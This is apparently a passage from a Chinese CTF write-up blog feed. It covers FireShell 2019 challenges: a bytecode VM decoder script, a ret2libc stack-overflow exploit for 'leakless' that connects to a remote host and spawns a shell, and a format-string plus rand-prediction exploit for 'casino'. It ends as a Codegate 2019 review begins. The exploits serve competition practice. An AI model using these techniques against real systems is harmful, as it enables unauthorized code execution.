class="number">0x000071E8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000023</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000071E8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000033</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000721B</span>, <span class="number">0x00000000</span>, <span class="number">0x00000054</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000726F</span>, <span class="number">0x00000000</span>, <span class="number">0x0000004A</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000072B9</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00023D9D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00023D9D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000015</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00023D9D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000053</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00023DF0</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00023DF4</span>, <span class="number">0x00000000</span>, <span class="number">0x00023D88</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00023DF4</span>, <span class="number">0x00000000</span>, <span class="number">0x00023DF4</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000021</span>, <span class="number">0x00000000</span>, <span class="number">0x00000044</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000021</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005D</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000007E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000043</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000007E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000042</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000007E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000049</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000000C7</span>, <span class="number">0x00000000</span>, <span class="number">0x0000002C</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000000C7</span>, <span class="number">0x00000000</span>, <span class="number">0x00000038</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000000FF</span>, <span class="number">0x00000000</span>, <span class="number">0x00000029</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000128</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000012E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000136</span>, <span class="number">0x00000000</span>, <span class="number">0x00000115</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000136</span>, <span class="number">0x00000000</span>, <span class="number">0x00000136</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000007D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000002EE</span>, <span class="number">0x00000000</span>, <span class="number">0x0000002E</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000002EE</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BB8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000033</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BB8</span>, <span class="number">0x00000000</span>, <span class="number">0x00000014</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BCC</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BCC</span>, <span class="number">0x00000000</span>, <span class="number">0x00000035</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BCC</span>, <span class="number">0x00000000</span>, <span class="number">0x0000001A</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BE6</span>, <span class="number">0x00000000</span>, <span class="number">0x00000058</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BE6</span>, <span class="number">0x00000000</span>, <span class="number">0x00000046</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000BE6</span>, <span class="number">0x00000000</span>, <span class="number">0x00000042</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000C28</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000C28</span>, <span class="number">0x00000000</span>, <span class="number">0x00000022</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000C4A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00003D72</span>, <span class="number">0x00000000</span>, <span class="number">0x00000053</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00003D72</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00003D7D</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005D</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00003D7D</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005F</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00003D7D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00022965</span>, <span class="number">0x00000000</span>, <span class="number">0x000228E8</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00022965</span>, <span class="number">0x00000000</span>, <span class="number">0x00022965</span>, <span class="number">0x00000006</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>]</span><br><span class="line">i = <span class="number">-1</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">buf = [<span class="number">0</span> <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">530</span>)]</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">    <span class="keyword">if</span> i - <span class="number">1</span> != tmp <span class="keyword">and</span> buf[i - <span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">        flag += chr(buf[i])</span><br><span class="line">        tmp = i - <span class="number">1</span></span><br><span class="line">    c = code[j]</span><br><span class="line">    <span class="keyword">if</span> c == <span class="number">0</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        buf[i] = code[j]</span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">1</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        buf[i] += buf[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Over'</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">4</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        buf[i] *= buf[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">5</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        buf[i] /= buf[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">6</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">        buf[i] -= buf[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">2</span>:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Error'</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'buf[&#123;&#125;] = &#123;&#125;'</span>.format(str(i), hex(buf[i]))</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>同时在buf的值中发现<code>buf[0] = 0x46 = &#39;F&#39; ; buf[11] = 0, buf[12] = 0x23 = &#39;#&#39; ; ...</code>，猜测每次输出为<code>buf[i] = 0</code>的后一个值即<code>buf[i + 1]</code>为flag的值。对脚本稍作修改后得到flag。</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="leakless"><a href="#leakless" class="headerlink" title="leakless"></a>leakless</h2><p>简单栈溢出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[leakless] checksec leakless</span><br><span class="line">[*] '/root/ctf/2019-FireShell/leakless/leakless'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>没开canary和pie。可以看到溢出漏洞在这里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> feedme()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次先泄露出puts的地址，然后找到libc的版本，return回<code>feedme()</code>函数。第二次直接跳system。exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = remote(<span class="string">'35.243.188.20'</span>, <span class="number">2002</span>)</span><br><span class="line">elf = ELF(<span class="string">'./leakless'</span>)</span><br><span class="line">offset = <span class="number">76</span></span><br><span class="line">feedme = elf.symbols[<span class="string">'feedme'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">'feedme = '</span> + hex(feedme))</span><br><span class="line">log.success(<span class="string">'puts_plt = '</span> + hex(puts_plt))</span><br><span class="line">log.success(<span class="string">'puts_got = '</span> + hex(puts_got))</span><br><span class="line">payload1 = flat([</span><br><span class="line"><span class="string">'A'</span> * offset, </span><br><span class="line">puts_plt, </span><br><span class="line">feedme, </span><br><span class="line">puts_got</span><br><span class="line">])</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">'puts = '</span> + hex(puts))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts)</span><br><span class="line">libc_base = puts - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">str_bin_sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span class="line">log.success(<span class="string">'str_bin_sh = '</span> + hex(str_bin_sh))</span><br><span class="line">payload2 = flat([</span><br><span class="line"><span class="string">'A'</span> * offset, </span><br><span class="line">system, </span><br><span class="line"><span class="number">0x12345678</span>,</span><br><span class="line">str_bin_sh</span><br><span class="line">])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="casino"><a href="#casino" class="headerlink" title="casino"></a>casino</h2><p>除了pie其他保护都开了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[casino] checksec casino                                                                       11:02:20 </span><br><span class="line">[*] '/root/ctf/2019-FireShell/casino/casino'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>在ida里查看main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> ptr; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setup(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  seed = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)time(<span class="number">0L</span>L) / <span class="number">0xA</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What is your name? "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome "</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  seed += bet;</span><br><span class="line">  srand(seed);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d/100] Guess my number: "</span>, i);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v8 != v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Sorry! It was not my number"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Correct!"</span>);</span><br><span class="line">    v5 += bet;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Cool! Here's another prize"</span>);</span><br><span class="line">    stream = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">    fread(&amp;ptr, <span class="number">0x1E</span>uLL, <span class="number">1u</span>LL, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要猜99次随机数，然后使得由<code>bet</code>累加起来大于100即得到flag。首先要过前面的猜数字，照样子写一个c程序即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> seed = time(<span class="number">0</span>) / <span class="number">0xA</span>;</span><br><span class="line"><span class="keyword">int</span> bet = <span class="number">2</span>; <span class="comment">// 1;</span></span><br><span class="line">    seed += bet;</span><br><span class="line">    srand(seed);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">99</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> a = rand();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, a);  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先编译，<code>gcc solve.c -o solve</code>；再pipe一下，<code>(echo &#39;test&#39;; ./solve) | ./casino</code>。得到结果是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[1/100] Guess my number: Correct!</span><br><span class="line">...</span><br><span class="line">[99/100] Guess my number: Correct!</span><br></pre></td></tr></table></figure><p>说明猜数字过了，而bet累加起来只有99，没有超过100。此时回忆之前的代码，<code>printf(&quot;Welcome &quot;, &amp;buf);</code>存在格式化字符串漏洞，我们只需要通过这个漏洞，将<code>bet</code>的值改写即可。通过gdb调试得到<code>bet</code>的地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x400ac3 &lt;main+132&gt;:call   0x400840 &lt;printf@plt&gt;</span><br><span class="line">   0x400ac8 &lt;main+137&gt;:mov    edi,0xa</span><br><span class="line">   0x400acd &lt;main+142&gt;:call   0x4007f0 &lt;putchar@plt&gt;</span><br><span class="line">=&gt; 0x400ad2 &lt;main+147&gt;:mov    eax,DWORD PTR [rip+0x201548]        # 0x602020 &lt;bet&gt;</span><br><span class="line">   0x400ad8 &lt;main+153&gt;:add    DWORD PTR [rbp-0x50],eax</span><br><span class="line">   0x400adb &lt;main+156&gt;:mov    eax,DWORD PTR [rbp-0x50]</span><br><span class="line">   0x400ade &lt;main+159&gt;:mov    edi,eax</span><br><span class="line">   0x400ae0 &lt;main+161&gt;:call   0x400870 &lt;srand@plt&gt;</span><br></pre></td></tr></table></figure><p>确定第一个参数在栈上的偏移为11：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[casino] python -c 'print "%2c%11$n" + "\x20\x20\x60\x00\x00\x00\x00\x00"' &gt; input             20:06:05 </span><br><span class="line">[casino] gdb ./casino -q                                                                       20:06:11 </span><br><span class="line">Reading symbols from ./casino...(no debugging symbols found)...done.</span><br><span class="line"><span class="meta">assassinq&gt;</span>&gt; b *main+137</span><br><span class="line">Breakpoint 1 at 0x400ac8</span><br><span class="line"><span class="meta">assassinq&gt;</span>&gt; r &lt; input </span><br><span class="line">Starting program: /root/ctf/2019-FireShell/casino/casino &lt; input</span><br><span class="line">What is your name? Welcome  ?  `</span><br><span class="line">Breakpoint 1, 0x0000000000400ac8 in main ()</span><br><span class="line"><span class="meta">assassinq&gt;</span>&gt; x/wx 0x602020</span><br><span class="line">0x602020 &lt;bet&gt;:0x00000002</span><br></pre></td></tr></table></figure><p>我把bet的值改为2。最后的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./casino'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">bet_addr = <span class="number">0x0000000000602020</span></span><br><span class="line">bet = <span class="number">2</span></span><br><span class="line">offset = <span class="number">11</span></span><br><span class="line">fmt = <span class="string">'%&#123;&#125;c%&#123;&#125;$n'</span></span><br><span class="line">payload = flat([fmt.format(str(bet), str(offset)), bet_addr])</span><br><span class="line">p.sendlineafter(<span class="string">'name?'</span>, payload)</span><br><span class="line">s = process(<span class="string">'./solve'</span>)</span><br><span class="line">nums = s.recvall().split(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">p.sendlineafter(<span class="string">'number:'</span>, n)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://cute-0tter.hatenablog.com/entry/2019/01/28/153836" target="_blank" rel="noopener">https://cute-0tter.hatenablog.com/entry/2019/01/28/153836</a><br><a href="https://mp.weixin.qq.com/s/T5APY4HJnw7rM3nvxDi8NA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/T5APY4HJnw7rM3nvxDi8NA</a><br><a href="https://mp.weixin.qq.com/s/LzyKtwmqq5HO6meUqq7aug" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/LzyKtwmqq5HO6meUqq7aug</a><br><a href="https://github.com/D4nch3n/Cyber-Competitions/blob/master/fireshellctf/README.md" target="_blank" rel="noopener">https://github.com/D4nch3n/Cyber-Competitions/blob/master/fireshellctf/README.md</a><br><a href="https://github.com/flawwan/CTF-Writeups/blob/master/Fireshell/casino/casino.md" target="_blank" rel="noopener">https://github.com/flawwan/CTF-Writeups/blob/master/Fireshell/casino/casino.md</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;比赛没打，当作练习以及看着大佬的writeup复现了一下几道二进制。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="review" scheme="https://qianfei11.github.io/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>2019-Codegate-review</title>
    <link href="https://qianfei11.github.io/2019/01/28/2019-Codegate-review/"/>
    <id>https://qianfei11.github.io/2019/01/28/2019-Codegate-review/</id>
    <published>2019-01-28T01:41:35.000Z</published>
    <updated>2019-02-02T12:27:50.907Z</updated>
    
    <content type="html"><![CDATA[<p>打了一次Codegate真滴太难了。跟着国外大佬的writeup复现还是学到了一点东西。</p><a id="more"></a><h1 id="MIC-check"><a href="#MIC-check" class="headerlink" title="MIC check"></a>MIC check</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9P&amp;;gFD,5.BOPCdBl7Q+@V’1dDK?qL</span><br></pre></td></tr></table></figure><p>找个在线解base85的网站即可。</p><h1 id="KingMaker"><a href="#KingMaker" class="headerlink" title="KingMaker"></a>KingMaker</h1><p>运行elf发现是一个在终端上的文字冒险游戏，每次做出选择然后输入key，若正确则进入下一环节。main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 